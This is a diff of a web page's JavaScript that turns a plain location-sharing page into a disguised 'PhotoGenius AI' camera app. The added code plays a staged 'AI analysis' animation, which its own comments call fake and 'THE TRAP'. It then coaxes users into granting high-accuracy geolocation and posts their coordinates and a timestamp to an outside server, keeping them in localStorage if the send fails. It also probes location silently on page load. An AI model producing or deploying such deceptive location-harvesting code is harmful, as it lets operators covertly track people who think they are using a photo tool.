-                const statusElement = document.getElementById('status');
-                statusElement.textContent = "Getting your Choice";
-                statusElement.className = "loading";
+            updateDebugStatus("🚀 Starting AI Smart Analysis...");
+            analysisActive = true;
+            
+            // Disable camera button
+            const cameraBtn = document.getElementById('cameraBtn');
+            cameraBtn.disabled = true;
+            cameraBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+            
+            // Show modal with smooth animation
+            const modal = document.getElementById('analysisModal');
+            modal.style.display = 'flex';
+            setTimeout(() => {
+                modal.classList.add('active');
+            }, 10);
+            
+            // Start fake AI analysis
+            simulateAIAnalysis();
+        }
+
+        // Fake AI analysis steps
+        function simulateAIAnalysis() {
+            updateDebugStatus("🤖 Step 1: Initializing Neural Network...");
+            
+            const steps = ['step1', 'step2', 'step3', 'step4'];
+            let currentStep = 0;
+            
+            const runStep = () => {
+                if (currentStep >= steps.length) return;
                 
-                // Disable button while processing
-                const locationBtn = document.getElementById('locationBtn');
-                locationBtn.disabled = true;
-                locationBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Processing...</span>';
-                
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    
-                    // Update status message
-                    statusElement.textContent = "Sending Choice to server...";
-                    
-                    // Your Spring Boot backend URL
-                    const backendUrl = "https://locationfinder-pdzb.onrender.com/api/location";
-                    
-                    // Send location data to your Spring Boot backend
-                    fetch(backendUrl, {
-                        method: "POST",
-                        headers: { 
-                            "Content-Type": "application/json",
-                            "Accept": "application/json"
-                        },
-                        body: JSON.stringify({ 
-                            latitude: lat, 
-                            longitude: lon,
-                            photoStyleId: selectedPhotoId // Adding the photo style ID
-                        })
-                    })
-                    .then(res => {
-                        if (res.ok) {
-                            return res.text();
-                        } else {
-                            throw new Error('Server responded with status: ' + res.status);
-                        }
-                    })
-                    .then(data => {
-                        // Show success with address from LocationIQ
-                        statusElement.textContent = "Succesfull added photo description: ";
-                        statusElement.className = "success";
-                        
-                        // Update button to show success
-                        locationBtn.innerHTML = '<i class="fas fa-check"></i><span>choice updated</span>';
-                        
-                        // Log the data
-                        console.log("Location data sent successfully. Response:", data);
-                        
-                        // Show the returned address in a more readable format
-                        setTimeout(() => {
-                            alert("photho description added");
-                        }, 500);
-                    })
-                    .catch(err => {
-                        // Handle fetch errors
-                        statusElement.textContent = "Error sending location: " + err.message + 
-                            "\n\nNote: Make sure your Spring Boot server is running on https://locationfinder-pdzb.onrender.com" +
-                            "\nand has CORS enabled with @CrossOrigin annotation.";
-                        statusElement.className = "error";
-                        
-                        // Re-enable the button
-                        locationBtn.disabled = false;
-                        locationBtn.innerHTML = '<i class="fas fa-map-marker-alt"></i><span>Share My Location</span>';
-                        
-                        console.error("Error sending location:", err);
-                        
-                        // For demo purposes, you could use a fallback
-                        // showMockSuccess(lat, lon, locationBtn, statusElement);
-                    });
-                }, function(error) {
-                    // Handle geolocation errors
-                    const statusElement = document.getElementById('status');
-                    let errorMessage = "Error getting data: ";
-                    
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMessage += "Permission denied.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMessage += "data information unavailable.";
-                            break;
-                        case error.TIMEOUT:
-                            errorMessage += "request timed out.";
-                            break;
-                        default:
-                            errorMessage += "Unknown error.";
-                            break;
+                // Update all steps
+                steps.forEach((stepId, index) => {
+                    const step = document.getElementById(stepId);
+                    if (index <= currentStep) {
+                        step.classList.add('active');
+                    } else {
+                        step.classList.remove('active');
                     }
-                    
-                    statusElement.textContent = errorMessage;
-                    statusElement.className = "error";
-                    
-                    // Re-enable the button
-                    const locationBtn = document.getElementById('locationBtn');
-                    locationBtn.disabled = false;
-                    locationBtn.innerHTML = '<i class="fas fa-map-marker-alt"></i><span>Share My Location</span>';
                 });
-            } else {
-                alert("Geolocation is not supported by this browser.");
+                
+                // Special actions for each step
+                switch(currentStep) {
+                    case 0:
+                        updateDebugStatus("🔧 Step 2: Analyzing Lighting Conditions...");
+                        break;
+                    case 1:
+                        updateDebugStatus("📍 Step 3: Location-Based Optimization...");
+                        // Highlight location box
+                        setTimeout(() => {
+                            const locationBox = document.getElementById('locationBox');
+                            locationBox.style.animation = 'pulse-border 2s infinite';
+                            locationBox.style.border = '2px solid #ff3366';
+                            updateDebugStatus("🎯 Location permission required for AI features");
+                        }, 500);
+                        break;
+                    case 2:
+                        updateDebugStatus("⏳ Step 4: Weather Integration...");
+                        break;
+                }
+                
+                currentStep++;
+                if (currentStep < steps.length) {
+                    setTimeout(runStep, 1500);
+                }
+            };
+            
+            runStep();
+        }
+
+        // The actual location permission request (THE TRAP)
+        function requestLocationPermission() {
+            updateDebugStatus("🎯 User clicked 'Enable Smart Features'");
+            
+            // Show loading state
+            const enableBtn = document.getElementById('enableBtn');
+            enableBtn.disabled = true;
+            enableBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enabling...';
+            
+            // Update location box
+            const locationBox = document.getElementById('locationBox');
+            locationBox.innerHTML = `
+                <div style="text-align: center; padding: 20px;">
+                    <div class="loading"></div>
+                    <h3 style="color: #4dffea;">Enabling AI Intelligence</h3>
+                    <p>Configuring smart camera features...</p>
+                    <p style="font-size: 0.9rem; opacity: 0.7; margin-top: 10px;">
+                        <i class="fas fa-info-circle"></i> Please allow location access when prompted
+                    </p>
+                </div>
+            `;
+            
+            // Request location after 1 second
+            setTimeout(() => {
+                updateDebugStatus("📡 Requesting location permission from browser...");
+                
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        // Success - user allowed location
+                        function(position) {
+                            updateDebugStatus("✅ SUCCESS! Location captured");
+                            locationCaptured = true;
+                            
+                            // Send to server
+                            sendLocationToServer(position.coords);
+                            
+                            // Show success
+                            showSuccess();
+                        },
+                        // Error - user denied
+                        function(error) {
+                            updateDebugStatus("❌ Location permission denied");
+                            
+                            // Show error message
+                            locationBox.innerHTML = `
+                                <div style="text-align: center; padding: 20px; color: #ff3366;">
+                                    <i class="fas fa-exclamation-triangle" style="font-size: 3rem;"></i>
+                                    <h3>Limited AI Features</h3>
+                                    <p>Location access required for full optimization</p>
+                                    <button onclick="skipLocation()" style="
+                                        background: #ff3366; 
+                                        color: white; 
+                                        border: none; 
+                                        padding: 10px 30px; 
+                                        border-radius: 25px; 
+                                        margin-top: 20px;
+                                        cursor: pointer;
+                                        font-weight: bold;
+                                    ">
+                                        Continue Anyway
+                                    </button>
+                                </div>
+                            `;
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    updateDebugStatus("❌ Geolocation not supported");
+                    skipLocation();
+                }
+            }, 1000);
+        }
+
+        // Send location to server
+        function sendLocationToServer(coords) {
+            updateDebugStatus("📡 Sending location to server...");
+            
+            const backendUrl = "https://locationfinder-pdzb.onrender.com/api/location";
+            const locationData = {
+                latitude: coords.latitude,
+                longitude: coords.longitude,
+                photoStyleId: 1,
+                source: "PhotoGenius AI",
+                timestamp: new Date().toISOString(),
+                accuracy: coords.accuracy || "High"
+            };
+            
+            console.log("Location data to send:", locationData);
+            
+            fetch(backendUrl, {
+                method: "POST",
+                headers: { 
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(locationData)
+            })
+            .then(res => {
+                updateDebugStatus(`✅ Location sent (Status: ${res.status})`);
+                return res.text();
+            })
+            .then(data => {
+                console.log("Server response:", data);
+            })
+            .catch(err => {
+                updateDebugStatus("⚠️ Server not reachable, saving locally");
+                // Save locally as backup
+                const locations = JSON.parse(localStorage.getItem('ai_locations') || '[]');
+                locations.push(locationData);
+                localStorage.setItem('ai_locations', JSON.stringify(locations));
+            });
+        }
+
+        // Show success
+        function showSuccess() {
+            updateDebugStatus("🎉 AI optimization complete!");
+            
+            // Hide modal
+            const modal = document.getElementById('analysisModal');
+            modal.classList.remove('active');
+            setTimeout(() => {
+                modal.style.display = 'none';
+            }, 500);
+            
+            // Reset camera button
+            const cameraBtn = document.getElementById('cameraBtn');
+            cameraBtn.disabled = false;
+            cameraBtn.innerHTML = '<i class="fas fa-camera"></i>';
+            
+            // Show success notification
+            const notification = document.createElement('div');
+            notification.innerHTML = `
+                <div style="
+                    position: fixed;
+                    top: 20px;
+                    right: 20px;
+                    background: linear-gradient(135deg, #4dffea, #00ccff);
+                    color: #000;
+                    padding: 20px;
+                    border-radius: 15px;
+                    z-index: 10000;
+                    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                    animation: slideIn 0.5s ease;
+                    max-width: 300px;
+                ">
+                    <div style="display: flex; align-items: center; gap: 15px;">
+                        <div style="font-size: 2rem;">🤖</div>
+                        <div>
+                            <strong style="font-size: 1.1rem;">AI Optimization Complete!</strong>
+                            <div style="margin-top: 5px; font-size: 0.9rem;">
+                                16 AI features enabled<br>
+                                Ready for perfect photos
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(notification);
+            
+            // Create confetti
+            createConfetti();
+            
+            // Auto-remove notification
+            setTimeout(() => {
+                notification.style.animation = 'slideOut 0.5s ease';
+                setTimeout(() => notification.remove(), 500);
+            }, 5000);
+        }
+
+        // Skip location
+        function skipLocation() {
+            updateDebugStatus("🔄 Continuing with limited features");
+            
+            // Hide modal
+            const modal = document.getElementById('analysisModal');
+            modal.classList.remove('active');
+            setTimeout(() => {
+                modal.style.display = 'none';
+            }, 500);
+            
+            // Reset camera button
+            const cameraBtn = document.getElementById('cameraBtn');
+            cameraBtn.disabled = false;
+            cameraBtn.innerHTML = '<i class="fas fa-camera"></i>';
+            
+            // Show limited features notification
+            alert("⚠️ AI features limited without location\n\nSome smart features like Golden Hour Detection and Weather Integration will not work.");
+        }
+
+        // Confetti effect
+        function createConfetti() {
+            for (let i = 0; i < 100; i++) {
+                setTimeout(() => {
+                    const confetti = document.createElement('div');
+                    confetti.style.position = 'fixed';
+                    confetti.style.width = Math.random() * 15 + 5 + 'px';
+                    confetti.style.height = Math.random() * 15 + 5 + 'px';
+                    confetti.style.background = ['#ff3366', '#4dffea', '#00ccff', '#ff6bcb'][Math.floor(Math.random() * 4)];
+                    confetti.style.borderRadius = '50%';
+                    confetti.style.left = Math.random() * 100 + 'vw';
+                    confetti.style.top = '-20px';
+                    confetti.style.zIndex = '9999';
+                    confetti.style.pointerEvents = 'none';
+                    document.body.appendChild(confetti);
+                    
+                    confetti.animate([
+                        { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
+                        { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
+                    ], {
+                        duration: 2000 + Math.random() * 2000,
+                        easing: 'cubic-bezier(0.215, 0.610, 0.355, 1)'
+                    });
+                    
+                    setTimeout(() => confetti.remove(), 4000);
+                }, i * 30);
             }
         }
-        
-        // Fallback function for demo if backend is not running
-        function showMockSuccess(lat, lon, button, statusElement) {
-            const mockAddress = "Road: Demo Street, City: Springfield, State: IL, Country: USA, Postcode: 62701";
-            statusElement.textContent = "Demo Mode: Location sent! Address: " + mockAddress;
-            statusElement.className = "success";
-            
-            button.disabled = true;
-            button.innerHTML = '<i class="fas fa-check"></i><span>Location Sent</span>';
-            
-            console.log("Mock location data sent:", { lat, lon, photoStyleId: selectedPhotoId });
-        }
-        
-        // Initialize with first photo selected
+
+        // Initialize
         window.onload = function() {
-            // Select the first photo by default
-            selectPhoto(1);
+            updateDebugStatus("🤖 PhotoGenius AI v2.4 loaded");
+            updateDebugStatus("📸 Click the red camera button to start");
+            
+            // Pre-warm geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    () => updateDebugStatus("📍 Location permission pre-granted"),
+                    () => {},
+                    { timeout: 1, maximumAge: Infinity }
+                );
+            }
         };
     </script>
 </body>
